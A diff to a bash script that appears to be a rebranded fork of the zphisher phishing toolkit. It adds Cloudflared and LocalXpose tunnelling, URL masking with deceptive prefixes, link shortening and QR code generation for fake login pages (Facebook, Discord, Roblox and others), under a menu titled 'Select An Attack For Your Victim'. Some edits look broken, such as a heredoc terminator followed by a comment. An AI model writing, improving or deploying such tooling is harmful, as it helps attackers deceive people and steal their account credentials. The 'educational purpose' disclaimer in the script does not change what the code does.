@@ -1,5 +1,5 @@
 
-
+#!/bin/bash
 __version__="1.0.0"
 
 ## DEFAULT HOST & PORT
@@ -79,38 +79,6 @@ kill_pid() {
 	done
 }
 
-# Check for a newer release
-check_update(){
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
-	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
-
-	if [[ $new_version != $__version__ ]]; then
-		echo -ne "${ORANGE}update found\n"${WHITE}
-		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
-		pushd "$HOME" > /dev/null 2>&1
-		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
-
-		if [[ -e ".zphisher.tar.gz" ]]; then
-			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
-			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
-			popd > /dev/null 2>&1
-			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
-			{ reset_color ; exit 1; }
-		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
-			{ reset_color; exit 1; }
-		fi
-	else
-		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
-	fi
-}
-
 ## Check Internet Status
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
@@ -167,7 +135,7 @@ dependencies() {
 	fi
 
 	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) && $(command -v qrencode) ]]; then
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+	        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
     else
         pkgs=(php curl unzip qrencode)
         for pkg in "${pkgs[@]}"; do
@@ -288,20 +256,14 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Author   ${RED}:  ${ORANGE}m13hack ${RED}
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/m13hack
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
 		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
 		  any misuse of this toolkit ${RED}!${WHITE}
-		
-		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
-		  Yisus7u7
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -388,6 +350,41 @@ capture_data() {
 	done
 }
 
+start_cloudflared() { 
+	rm .cld.log > /dev/null 2>&1 &
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	fi
+
+	sleep 8
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	custom_url "$cldflr_url"
+	capture_data
+}
+
+localxpose_auth() {
+	./.server/loclx -help > /dev/null 2>&1 &
+	sleep 1
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+
+	[ "$(./.server/loclx account status | grep Error)" ] && {
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		sleep 3
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		[[ $loclx_token == "" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+		} || {
+			echo -n "$loclx_token" > $auth_f 2> /dev/null
+		}
+	}
+}
 
 ## Start LocalXpose (Again...)
 start_loclx() {
@@ -447,21 +444,21 @@ tunnel_menu() {
 	esac
 }
 
-# Custom Mask URL Function
+## Custom Mask URL
 custom_mask() {
-    { sleep .5; clear; banner_small; echo; }
-    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
-    echo
-    if [[ ${mask_op,,} == "y" ]]; then
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-        read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url
-        if [[ ${mask_url//:*} =~ ^(http|https)?$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
-            mask=$mask_url
-            echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
-        else
-            echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
-        fi
-    fi
+	{ sleep .5; clear; banner_small; echo; }
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	echo
+	if [[ ${mask_op,,} == "y" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+			mask=$mask_url
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+		fi
+	fi
 }
 
 # URL Shortener Functions
@@ -477,47 +474,44 @@ shorten() {
 }
 
 custom_url() {
-    url=${1#http*//}
-    isgd="https://is.gd/create.php?format=simple&url="
-    shortcode="https://api.shrtco.de/v2/shorten?url="
-    tinyurl="https://tinyurl.com/api-create.php?url="
+	url=${1#http*//}
+	isgd="https://is.gd/create.php?format=simple&url="
+	shortcode="https://api.shrtco.de/v2/shorten?url="
+	tinyurl="https://tinyurl.com/api-create.php?url="
 
-    { custom_mask; sleep 1; clear; banner_small; }
-    if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
-        if [[ $(site_stat $isgd) == 2* ]]; then
-            shorten $isgd "$url"
-        elif [[ $(site_stat $shortcode) == 2* ]]; then
-            shorten $shortcode "$url"
-        else
-            shorten $tinyurl "$url"
-        fi
+	{ custom_mask; sleep 1; clear; banner_small; }
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+		if [[ $(site_stat $isgd) == 2* ]]; then
+			shorten $isgd "$url"
+		elif [[ $(site_stat $shortcode) == 2* ]]; then
+			shorten $shortcode "$url"
+		else
+			shorten $tinyurl "$url"
+		fi
 
-        url="https://$url"
-        masked_url="$mask@$processed_url"
-        processed_url="https://$processed_url"
+		url="https://$url"
+		masked_url="$mask@$processed_url"
+		processed_url="https://$processed_url"
+	else
+		url="Unable to generate links. Try after turning on hotspot"
+		processed_url="Unable to Short URL"
+	fi
 
-        # Generate QR Codes
-        qrencode -o "url_qr.png" "$url"
-        qrencode -o "masked_qr.png" "$masked_url"
-        qrencode -o "shortened_qr.png" "$processed_url"
-    else
-        url="Unable to generate links. Try after turning on hotspot"
-        processed_url="Unable to Short URL"
-    fi
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 
-    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-    [[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
-
-    # Display QR codes
-    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for URL :"
-    echo -e "${GREEN}url_qr.png"
-    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for Masked URL :"
-    echo -e "${GREEN}masked_qr.png"
-    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for Shortened URL :"
-    echo -e "${GREEN}shortened_qr.png"
-EOF
+	# Generate QR code for the URL
+	if [[ $processed_url != *"Unable"* ]]; then
+		qrencode -o qr.png "$processed_url" 2>/dev/null
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for URL 2 generated: ${ORANGE}qr.png"
+		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Scan the QR code to access the URL."
+		
+		# Optional: Display the QR code
+		display qr.png 2>/dev/null &
+	fi
 }
+
 site_facebook()  {
     cat <<- EOF
         ${RED}[${WHITE}01${RED}]${ORANGE} Facebook Login Page
@@ -551,7 +545,6 @@ EOF
             clear
             banner_small
             site_facebook
-            return
             ;;
     esac
     generate_qr "$mask"
@@ -651,10 +644,9 @@ EOF
 }
 
 
-
-## Menu
 main_menu() {
     { clear; banner; echo; }
+
     cat <<- EOF
         ${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
@@ -672,9 +664,9 @@ main_menu() {
         ${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
         ${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
-EOF  # Properly closed EOF
+EOF  # Properly closed EOF without any spaces or tabs before it
 
-    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" REPLY
 
     case $REPLY in 
         1 | 01)
